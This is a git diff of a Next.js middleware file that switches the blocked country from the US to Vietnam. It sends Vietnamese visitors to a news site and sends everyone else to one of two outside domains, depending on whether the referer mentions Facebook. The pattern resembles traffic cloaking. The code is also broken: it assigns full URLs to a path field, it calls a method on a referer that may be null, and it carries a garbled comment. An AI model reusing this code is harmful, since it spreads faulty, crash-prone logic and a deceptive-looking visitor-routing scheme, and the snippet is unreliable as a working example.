@@ -1,8 +1,7 @@
 import { NextResponse } from 'next/server';
-import { NextRequest } from 'next/server';
 
-// The country to block from accessing the secret page
-const BLOCKED_COUNTRY = 'US';
+// The country to block from accessing the secret pageVN
+const BLOCKED_COUNTRY = 'VN';
 
 // Trigger this middleware to run on the `/secret-page` route
 export const config = {
@@ -12,21 +11,21 @@ export const config = {
 export function middleware(req) {
     // Extract country. Default to US if not found.
     const country = (req.geo && req.geo.country) || 'US';
+    const referer = req.headers.get('referer');
 
-    console.log(req.url);
-    console.log(req.referrer);
     console.log(req.headers.get('referer'));
-    console.log(req.ip);
-    console.log(req.signal);
-    console.log(req.geo);
-    console.log(req.destination);
-    console.log(req.headers);
+    console.log(country);
 
     // Specify the correct route based on the requests location
     if (country === BLOCKED_COUNTRY) {
-        req.nextUrl.pathname = '/login';
+        req.nextUrl.pathname = 'https://vnexpress.net/';
     } else {
-        req.nextUrl.pathname = `/secret-page`;
+        if(referer.includes('facebook')) {
+            req.nextUrl.pathname = 'https://svykute.com/';
+        }
+        else {
+            req.nextUrl.pathname = 'https://zululion.com/';
+        }
     }
 
     // Rewrite to URL
